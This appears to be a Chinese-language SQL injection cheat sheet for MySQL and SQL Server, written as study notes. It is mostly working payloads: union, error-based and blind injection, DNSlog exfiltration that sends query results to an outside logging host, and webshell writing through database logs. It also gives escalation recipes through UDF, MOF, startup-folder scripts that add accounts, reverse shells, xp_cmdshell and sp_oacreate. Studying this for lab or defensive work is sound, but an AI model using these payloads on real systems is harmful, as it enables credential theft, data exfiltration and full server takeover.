# SQL注入漏洞


# 简介

SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过滤，便将SQL语句带入数据库执行。SQL注入过程如图所示。

![](http://image.xpshuai.cn/img/image-20220119193306514.png)



# 分类

## 按类型：

### 1.数字型

输入的参数x为整型的时候，通常[sql语句](https://so.csdn.net/so/search?q=sql语句&spm=1001.2101.3001.7020)是这样的

```csharp
select * from users where id =x

```

> 这种类型可以使用经典的and 1=1 和 and 1=2来判断

**原因：**
当输入and 1=1时，后台会执行sql语句是

```csharp
select * from users where id =x and 1=1；

```

没有语法显示错误且，返回正常

当输入and 1=2时，后台会执行sql语句是

```csharp
select * from users where id =1 and 1=2;

```

没有语法错误且，返回错误

**我们在使用假设：**
如果是字符型注入的话，我们输入的语句应该会出现这样的状况

```csharp
select * from users where id ='1 and 1=1'; 
select * from users where id ='1 and 1=2';

```

查询语句将and语句全部转换成字符串，并没有进行and的逻辑判断，所以不会出现以上结果，所以这个等式是不成立的。



### 2.字符型

当输入的参数x为字符型时，通常sql语句会这样的

```csharp
select * from users where id ='x'

```

> 这种类型我们可以使用and ‘1’='1 和 and ‘1’='2来进行测试



**原因：**
当输入and ‘1’=‘1的时候，后台执行的语句是

```csharp
select * from users where id='x' and '1'='1'

```

语法正确，逻辑判断正确，返回正确

当输入and ‘1’=‘2的时候，后台执行的语句是

```csharp
select * from users where id='x' and '1'='2'

```

语法正确，逻辑判断错误，返回错误

字符型和数字型最大的一个**区别**在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。



## 按执行效果分类

下面那些：

报错

盲注

联合

。。。





# MySQL注入

> 主要内容以MySQL为例进行说明，其他数据库类似，只做简单介绍，具体操作以MySQL类推即可



Docker下载sqli-labs:

```bash
docker pull acgpiano/sqli-labs
docker images
docker run -dt  --name sqli acgpiano/sqli-labs -p 80:80 --rm acgpiano/sqli-labs # docker 的80映射到本地,  docker环境停止之后，删除所有创建的镜像
docker exec -it c351ff0ff80f /bin/bash  # 进入容器

docker stop <ContainerId(或者name)>

# 删除容器
docker rm

删除镜像
docker rmi

```





**MySQL5.0之后增加了information_schema**

```
# information_schema数据库表说明:

1、SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。

2、TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。

3、COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

4、STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。

5、USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。

6、SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。

7、TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。

8、COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。

9、CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。

10、COLLATIONS表：提供了关于各字符集的对照信息。

11、COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。

12、TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。

13、KEY_COLUMN_USAGE表：描述了具有约束的键列。

14、ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。

15、VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。

16、TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表
```







## 注入流程

1.判断是否存在注入

```
?id=1' and '1'='1
```

2.判断列数

```
?id=1' order by 4--+
# 5的时候不显示，4的时候显示正常就是4列
```

3.数据库名

```
?id=0' union select 1,2,3,database()--+
```

4.根据数据库查数据表名

```
?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

5.根据表名查列名

```
?id=0' union select 1,2,3,group_concat(column_name) from information_schema.clumns where table_name='前面查出来的表名' and table_schema=database() --+
```

6.数据

```
?id=0' union select 1,2,3,group_concat(password) from users --+
```





## 联合注入

```bash
?id=1' order by 4--+

?id=0' union select 1,2,3,database()--+

?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+

?id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name="users" --+
#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name


?id=0' union select 1,2,3,group_concat(password) from users --+
#group_concat 可替换为 concat_ws(',',id,users,password )


?id=0' union select 1,2,3,password from users limit 0,1--+
```







## **报错注入**

```bash

# 1.floor()
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

# 2.extractvalue()
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

# 3.updatexml()
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

# 4.geometrycollection()
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

# 5.multipoint()
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

# 6.polygon()
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

# 7.multipolygon()
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

# 8.linestring()
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

# 9.multilinestring()
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

# 10.exp()
select * from test where id=1 and exp(~(select * from(select user())a));
```

**exp() 报错的原理：**exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。

**updatexml() 报错的原理：**由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。

**floor()报错的原理：**[Floor报错原理分析 - ka1n4t - 博客园 (cnblogs.com)](https://www.cnblogs.com/litlife/p/8472323.html)



```bash
爆库：
?id=1' and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +

爆表：
?id=1' and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +

爆字段：
?id=1' and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +

爆数据：
?id=1' and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +

#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)
```



这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：

```bash
substr(string string,num start,num length); #string为字符串,start为起始位置,length为长度

?id=1' and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +
```



## **盲注**

> 场景：无回显，并且没有报错和其他显示。且如果能用布尔就不用延迟



**几个相关函数：**

```bash
regexp regexp '^xiaodi[a-z]' 匹配xiaodi及xiaodi...等
if if(条件,5,0) 条件成立 返回5 反之 返回0
sleep sleep(5) SQL语句延时执行5秒
mid mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位
substr substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度
left left(database(),1)，database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位
length length(database())=8，判断数据库database()名的长度
ord=ascii ascii(x)=101，判断x的ascii码是否等于101，即email中的字母e
IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。
CAST()和CONVERT()函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：CAST(value as type); CONVERT(value, type);
```



### **时间注入**

时间盲注也叫延时注入, 一般用到函数 `sleep()`, `BENCHMARK()`,还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)

一般时间盲注我们还需结合**条件判断函数**：

```bash
#if（expre1，result1，result2）
当 expre1 为 true 时，返回 result1，false 时，返回 result2

#盲注的同时也配合着 mysql 提供的分割函数：substr、substring、left
```

一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有： `ascii()`,` hex()` 等等

```
?id=1' and if(ascii(substr(database(),1,1))>115,1,sleep(5))--+

?id=1' and if((substr((select user()),1,1)='r'),sleep(5),1)--+
```

步骤跟正常注入一样，只不过是逐位判断ascii码，如果为某个值，就sleep延时几秒的方式。



### **布尔盲注**

```bash

?id=1' and substr((select user()),1,1)='r' -- +

?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +
#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值

?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +
#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 
```





### DNSlog注入

> 解决了盲注不能回显数据，效率低的问题

**前提：**
需要高权限
需要是Windows系统



**工具：**

http://ceye.io/
或者其他DNSlog平台
工具，如：https://github.com/ADOOO/DnslogSqlinj



使用语句：

```bash
http://127.0.0.1:8080/sqlilabs/less-2/?id=-1 and if((select load_file(concat('\\\\',(select version()),'.1t7i2f.ceye.io\\abc'))),1,0)--+
# 使用load_file函数，里面带上我们dns log平台的域名， 然后在平台的DNSQuery里面看到结果

```

![](http://image.xpshuai.cn/img/image-20220119192501632.png)









## insert,delete,update

insert,delete,update 主要是用到盲注和报错注入，此类注入点**不建议使用 sqlmap 等工具**，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般**较难发现**，我们可以**尝试性插入** 引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入



### 报错

```

mysql> insert into admin (id,username,password) values (2,"or updatexml(1,concat(0x7e,(version())),0) or","admin");
Query OK, 1 row affected (0.00 sec)

mysql> select * from admin;
+------+-----------------------------------------------+----------+
| id   | username                                      | password |
+------+-----------------------------------------------+----------+
|    1 | admin                                         | admin    |
|    1 | and 1=1                                       | admin    |
|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
+------+-----------------------------------------------+----------+
3 rows in set (0.00 sec)

mysql> insert into admin (id,username,password) values (2,""or updatexml(1,concat(0x7e,(version())),0) or"","admin");
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'

#delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为false
mysql> delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'
```



### 盲注

```
#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等
mysql> insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',"admin");
Query OK, 1 row affected (5.00 sec)

mysql> insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',"admin");
Query OK, 1 row affected (0.00 sec)

#字符型注意闭合不能使用and
mysql> insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',"admin");
Query OK, 1 row affected (0.00 sec)

mysql> insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',"admin");
Query OK, 1 row affected (5.01 sec)

# delete 函数 or 右边一定要为 false
mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);
Query OK, 0 rows affected (0.00 sec)

mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);
Query OK, 0 rows affected (5.00 sec)

#update 更新数据内容
mysql> select * from admin;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | admin    | admin    |
+------+----------+----------+
4 rows in set (0.00 sec)

mysql> update admin set id="5"+sleep(5)+"" where id=2;
Query OK, 4 rows affected (20.00 sec)
Rows matched: 4  Changed: 4  Warnings: 0
```







## 二次注入

![](http://image.xpshuai.cn/img/image-20220119175625531.png)

二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码，这样就不会带有单引号等。

```

mysql> insert into admin (id,name,pass) values ('3',0x61646d696e272d2d2b,'11');
Query OK, 1 row affected (0.00 sec)

mysql> select * from admin;
+----+-----------+-------+
| id | name      | pass  |
+----+-----------+-------+
|  1 | admin     | admin |
|  2 | admin'111 | 11111 |
|  3 | admin'--+ | 11    |
+----+-----------+-------+
4 rows in set (0.00 sec)
```







## 宽字节注入

宽字节注入：针对目标做了一定的防护，单引号转变为 `\'` , mysql 会将 `\` 编码为 `%5c` ，宽字节中两个字节代表一个汉字，所以把 `%df` 加上 `%5c` 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入

```bash
id=-1%df' union select...
#没使用宽字节%27 -> %5C%27
#使用宽字节%df%27 -> %df%5c%27 -> 運'
```





## 文件操作

### 读文件

读文件前提：
1、用户权限足够高，尽量具有root权限。
2、secure_file_priv不为NULL



load_file()

```bash
insert into read2_tb(word) values (load_file('D:/test.txt'));



# load_file( )函数支持网络路径。如果你可以将DLL复制到网络共享中，那么你就可以直接加载并将它写入磁盘。
select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";

```



load data infile 

```bash
load data infile 'D:/test.txt' into table read2_tb;
```



### 写文件

into outfile

```bash
select * from read2_tb where 1=1 into outfile 'D:/test2.txt';

# 写webshell
id =-1 union select 1,'<?php phpinfo();?>',3,4 into outfile 'c:\\1.php'
```



into dumpfile

```bash
```







### 突破secure-file-priv(通过数据库日志写shell)

5.5.53之前版本，默认情况下此变量（`secure-file-priv`）为空，允许使用mysql终端对secure_file_priv参数更新（不讨论windows环境安装情况）。
5.5.53及之后版本修改secure_file_priv值只能修改my.cnf配置文件（不讨论windows环境安装)。



**load_file:**

![](http://image.xpshuai.cn/img/image-20220119190821425.png)



**secure_file_priv:**

![](http://image.xpshuai.cn/img/image-20220119190851930.png)



**into outfile:**

![](http://image.xpshuai.cn/img/image-20220119190916033.png)



#### 方法一：general_log

1.查看secure_file_priv值

```bash
show global variables like '%secure_file_priv%';
# show global variables like '%secure%';

# 此开关默认为NULL，即不允许导入导出
# 没有具体值时，表示不对mysqld 的导入|导出做限制
# 值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下

```



2.查询操作日志存放路径

```bash
show variables like 'general_log%';

# 操作日志默认也是关闭的

```

3.首先打开操作日志记录

```bash
set global general_log = 'ON';

```



4.设置操作记录日志路径

```bash
# set global general_log_file='路径地址';
# 选择网站的目录里面
set global general_log_file='D:\\phpstudy\\PHPTutorial\\WWW\\xx.php'

```

5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了

```bash
select '<?php @eval($_POST[1]);?>';

```

6.切记关闭

```bash
set global general_log = 'off';

```



7.访问webshell，后续操作







#### 方法二：slow_query_log

慢查询日志，用来记录在MySQL中响应时间超过阀值的语句。开启之后默认阀值是10s，可以更改此时间。

```bash
set global slow_query_log=on;

set global slow_query_log_file="c:\\phpStudy\\PHPTutorial\\wWwW\\3.php"

select sleep(15), '<?php assert($_POST[ "cmd"]);?>'

set global slow_query_log=off

```





## 权限提升

**常见密码获取方式：**
● 读取网站数据库配置文件（了解其命名规则及查找技巧）
sql, data, inc, config, conn, database, common, include等

● 读取数据库存储或备份文件（了解其数据库存储格式及对应内容）
位置：@@basedir/data/数据库名/表名.myd

```bash
# 先得到数据库安装目录
select @@basedir;
# mysql/user.myd是用户表，存储了用户的账号密码

# myd后缀的是数据表
xiaodi数据库名下的user信息 怎么写
mysql/data/xiaodi/user.myd

```

可以下载它之后然后进行还原



### 1.UDF导出提权(重点)

```bash
# 利用自定义执行函数导出dll文件进行命令执行
select version();
select user();   # 获取数据库用户
select @@basedir;  # 安装目录
show variables like '%plugins%';  # 寻找mysql安装路径 

# 手工创建或利用NTFS流创建 plugin目录(如下) 
select 'x' into dumpfile '......mysql/lib/plugin::INDEX_ALLOCATION';

# Note：
1.mysql<5.1 一般导出dll到目录c:/windows/system32
2.mysql=>5.1 导出安装目录的/lib/plugin/   # 默认不存在，需要创建

# 1.使用脚本(最下面资源MySQL.php)进行自定义函数导出为dll就行(可能会失败)
# 2.创建一个自定义函数与dll文件对应
create function cmdshell returns string soname 'moonudf.dll'  # 创建叫cmdshell的函数
# 3.执行命令
select cmdshell('命令')	# 就可以执行命令了
# 4.添加账户密码，后续操作

```





### 2.MOF加载提权

![](http://image.xpshuai.cn/img/image-20220119190452993.png)

系统目录中的mof/目录下有mof文件，目录下面的文件会被系统调用执行。

```bash
# 将mof上传至任意可读可写目录下
# 导出自定义mof文件到系统目录加载
c:/windows/system32/wbem/mof/

# 然后使用sql语句将系统当中默认的nullevt.mof给替换为我们自定义恶意的mof文件。进而让系统执行我们这个恶意的mof文件
# 替换的sql语句：select load_file('D:\WWW\xx.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';

```



### 3.启动项重启提权

```bash
# 启动项文件夹(开机或重启之后会自动加载的程序)
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp


#导出自定义bat或vbs到启动目录配合重启执行
将创建好的adduser.vbs或.bat文件(内容如下)进行服务器启动项写入，配合重启执行！
@echo off
net user xiaodi 123!@jqazQ /add
# 配合其他利用命令

# 怎么让服务器重启呢？
可以CC攻击流量过高, 对方服务器打不开时候，然后就会自动重启了

```





### 4.反弹SHELL提权(重点)

> 用于UDF没有成功取得cmdshell和MOF提权都失败的情况(对方把一些拓展/配置禁用了)

```bash
#采用MYSQL反弹函数获取权限，不再调用命令执行类函数!
select backshell(ip, 端口)

# 然后在自己机器上nc监听

```



### 5.sqlmap提权



### 6.利用msf提权









# SQL Server注入

## 简介

**权限分析：**

- sa (最高权限，所有操作都可以做)
- db （拥有者权限， 多个数据操作）
- public （单个数据操作[可能只有某个数据库甚至没权限]）



注释：

```
-- comment goes here
/* comment goes here */
```



常用查询：

```bash
# 查看用户
SELECT CURRENT_USER
SELECT user_name();
SELECT system_user;
SELECT user;

# 数据库版本
SELECT @@version

# 数据库名
SELECT DB_NAME()

#列数据库
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)

# 列表
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views

SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;

SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns

SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)


# 列列
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only

SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, column_name FROM information_schema.columns


# 提取用户名密码
#MSSQL 2000:
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

#MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins


# 堆叠注入
ProductID=1; DROP members--
```





**实验：**

```bash
http://219.153.49.228:40603/new_list.asp?id=2 and 1=1  #页面返回正常说明存在注入点。

# 第二步：查找列数 
http://219.153.49.228:40603/new_list.asp?id=2 order by 1 # 成功 ；order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。

# 第三步：查找回显点
http://219.153.49.228:40603/new_list.asp?id=2 and 1=2 union all select null,null,null,null；# 挨个替换null 发现 select null,2,null,null 页面出现回显。

# 第四步：查找所在库名称添加： 
?id=2 and 1=2 union all select 1,(select db_name()), '3', 4  #找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据库

# 第五步：查找数据库表名称：
?id=2 and 1=2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype = 'U'),'3',4  # 提示: xtype='U'为用户表 

# 第六步：查找列名称：
?id=2 and 1=2 union all select 1,(select top 1 col_name(object_id('manage'),1) from sysobjects),'3',4 #替换 col_name(object_id('manage'),1) 中的1 依次为 2，3，4查出所有列名。

# 第七步：查取数据: 
?id=2 and 1=2 union all select 1,(select top 1 username from manage),'3',4     # 获取用户名
?id=2 and 1=2 union all select 1,(select top 1 password from manage),'3',4     # 获取密码 

# 第八步：MD5 解密

```





## 注入流程

**判断是否为mssql数据库：**` and (select count(*) from sysobjects) >0`

**注入流程：**

```bash
# 0.1判断注入
and 1=1
and 1=2

# 0.2回显，判断数据库类型
And 1=2

# 0.3判断字段
order by ...


# 1.判断字段数量和类型
union all select null,null,null,null
union all select '1','2','3','4'
union all select '1','2',db_name(),'4'

# 2.联合查询
And 1=2 Union select ……
And 1=2 union all select ……
#注：判断字符是否特殊
And 1=2 union all select 1,2,’3’,4

# 2.1 猜数据库名
And 1 =2 union all select 1,db_name(),3,4
And 1 =2 union all select 1,db_name(1),3,4
And 1 =2 union all select 1,db_name(2),3,4
And 1 =2 union all select 1,db_name(3),3,4
……


# 3.猜表名
And 1=2 union all select 1,(select top 1 name from 数据库名.dbo.sysobjects where xtype=’u’),3,4
#3.1查看其它表名：
And 1=2 union all select 1,(select top 1 name from 数据库名.dbo.sysobjects where xtype=’u’ and name not in (‘表名’)),3,4

#实例：
union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),'3',4

union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),'3',4

union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage','announcement')),'3',4


# 3.查列名
union all select 1,(select top 1 col_name(object_id('manage'),1)from sysobjects),'3',4

union all select 1,(select top 1 col_name(object_id('manage'),2)from sysobjects),'3',4

union all select 1,(select top 1 col_name(object_id('manage'),3)from sysobjects),'3',4



#例子：
id=-2 union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null

id=-2 union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null

union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null


id=-2 union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null #以上几步说明mange表总共有3列，分别为：id、username、password

# 4.爆破值
union all select null,username, password ,null from manage





```



判断字段长度和值:

```bash
#判断username长度和值
# 长度 len()
and exists (select id from manage where len(username)<20 and id=1)

and exists (select id from manage where len(username)<15 and id=1)

and exists (select id from manage where len(username)=8 and id=1)

# 值 unicode()
and exists (select id from manage where unicode(substring(username,2,1)) = 100 and id=1)
```







## 联合注入

```
?id=-1' union select null,null--

?id=-1' union select @@servername, @@version--

?id=-1' union select db_name(),suser_sname()--

?id=-1' union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--

?id=-1' union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--

?id--1' union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--

?id=-1' union select (select top 1 column name from information_schema.columns where table_name='users' and column_name not in (select top 1 column_name from information_schema.columns where table_name = 'users')),null---

?id=-1' union select (select top 1 username from users where username not in (select top 3 username from users)),null--
```

## 报错注入

```bash
# 对于整数型
convert(int,@@version)
cast((SELECT @@version) as int)

# 对于字符型
' + convert(int,@@version) + '
' + cast((SELECT @@version) as int) + '
```



```
?id=1' and 1=(select 1/@@servername)--

?id=1' and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--
```

## 盲注 

### 布尔盲注

```
?id=1' and ascii(substring((select db_ name(1)),1,1))> 64--

AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -

AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 

AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

### 时间盲注

使用延时函数：`WAITFOR DELAY`

```bash
# 语法: WAITFOR DELAY '0:0:n'
#表⽰延迟4秒
WAITFOR DELAY '0:0:4' --  
 
 
# IF exists ()⼦句
IF exists () WAITFOR DELAY '0:0:5'
```

```
?id= 1';if(2>1) waitfor delay '0:0:5'--

?id= 1';if(ASCII(SUBSTRING((select db_name(1)),1,1))> 64) waitfor delay
```

```
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'     comment:   --
```





## 文件操作

判断文件是否存在

```bash
exec xp_fileexist "C:\\users\\public\\test.txt"

返回0表示文件不存在，1表示存在。

#在执行无回显命令时，把执行结果重定向到一个文件，再用xp_fileexist判断该文件是否存在，就可知道命令是否执行成功。

```

列目录

```bash
exec xp_subdirs "C:users\\Administrator\\",2,1

第一个参数设定要查看的文件夹。

第二个参数限制了这个存储过程将会进行的递归级数，默认是0或所有级别。

第三个参数告诉存储过程包括文件。默认是0或只对文件件，数值1代表结果集的文件
```



读取文件

```
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```



写文件

```bash
exec sp_makewebtask 'c:\www\testwr.asp',' select' '<%execute(request("SB"))%>''
```

需要开启Web Assistant Procedures

```bash
exec sp_configure 'web Assistant Procedures'，1; RECONFIGURE
```



在sql server 2012上开启失败。

创建目录

```bash
exec xp_create_subdir 'D:\test'
```



压缩文件

```bash
exec xp_makecab 'c:test.cab','mszip'，1, 'c:test.txt' , 'c:test1.txt'
```



## 信息获取

获取机器名

```bash
exec xp getnetname
```

获取系统信息

```bash
exec xp_msver
```

获取驱动器信息

```bash
exec xp_fixeddrives

```

获取域名

```bash
SELECT DEFAULT_DOMAIN( ) as mydomain;

```

遍历域用户

```bash
先获取RID

SELECT SUSER_SID('CATE4CAFE\Domain Admins')

采用循环SQL语句遍历即可遍历出所有域用户。

#或者使用
https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Get-SqlServer-Enum-WinAccounts.psm1
```



msf有个模块可以通过注入点枚举域用户

```
use auxiliary admin mssql/mssql_enum_domain_accounts_sali
```



## 命令执行&提权

### xp_cmdshell

xp_cmdshell(SQLServer 2005之后默认禁用)

```bash
# 启用xp_cmdshell：
use master;
EXEC sp_configure 'show advanced options', 1
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#执行命令
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';




# 关闭xp_cmdshell：
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'xp_cmdshell', 0;
reconfigure;
# 执行whoami  查看得到的权限是(如果是高权限就..., 如果是network service 权限-->就想别的办法)


# 如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复(xplog70.dll可以自己本地安装然后复制出来)
exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'

```



### sp_oacreate

```bash
## 启用：
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;   

# 关闭：
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 0;   
RECONFIGURE WITH OVERRIDE;  

## 执行： 
# 这个也可以上传一个木马
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'
# 针对无回显，就可以输出到txt文件：把系统命令执行结果输出到1.txt
#以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。


```



### SQL Server CLR

